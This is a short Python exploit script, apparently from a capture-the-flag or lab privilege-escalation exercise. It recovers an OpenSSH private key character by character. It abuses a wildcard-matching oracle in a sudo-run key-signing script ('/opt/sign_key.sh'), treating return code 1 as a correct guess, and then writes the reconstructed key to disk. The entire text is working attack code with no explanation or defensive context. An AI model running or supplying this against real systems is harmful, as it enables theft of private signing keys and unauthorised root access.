import string
import subprocess

header = "-----BEGIN OPENSSH PRIVATE KEY-----"
footer = "-----END OPENSSH PRIVATE KEY-----"
b64chars = string.ascii_letters + string.digits + "+/="
key = []
lines = 0
while True:
    for char in b64chars:
        with open("unknown.key", "w") as f:
            f.write(f"{header}\n{''.join(key)}{char}*")
        proc = subprocess.Popen("sudo /opt/sign_key.sh unknown.key root.pub root root_user 1",
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                shell=True)
        stdout, stderr = proc.communicate()
        if proc.returncode == 1:
            key.append(char)
            print(f"{''.join(key)}{char}")
            if len(key) > 1 and (len(key) - lines) % 70 == 0:
                key.append("\n")
                lines += 1
            break
    else:
       break
print(f"{header}\n{''.join(key)}\n{footer}")
with open("unknown.key", "w") as f:
    f.write(f"{header}\n{''.join(key)}\n{footer}")
